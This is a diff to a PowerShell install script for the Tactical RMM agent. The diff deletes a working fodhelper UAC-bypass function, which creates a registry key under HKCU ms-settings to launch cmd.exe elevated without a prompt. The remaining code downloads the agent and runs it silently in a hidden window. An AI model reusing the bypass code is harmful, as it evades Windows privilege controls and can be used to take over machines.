@@ -58,16 +58,12 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
             #Start-Sleep -s 5
             #Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait
 
-            FodhelperUACBypass -program="cmd /c start C:\Windows\System32\cmd.exe" #default
-            
             Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
             Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
             Write-Host ('Extracting...')
             Start-Sleep -Seconds 5
             Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + "--silent") -WindowStyle Hidden -Wait
 
-            #Start-Sleep 3
-            Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
             exit 0
         }
         Catch
@@ -84,23 +80,4 @@ If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
     } else {
         Write-Output "Unable to connect to server"
     }
-}
-function FodhelperUACBypass(){ 
- Param (
-           
-        [String]$program 
-       )
-　
-    #Create Registry Structure
-    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
-　
-    #Start fodhelper.exe
-    #Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
-　
-    #Cleanup
-    #Start-Sleep 3
-    #Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
-　
 }
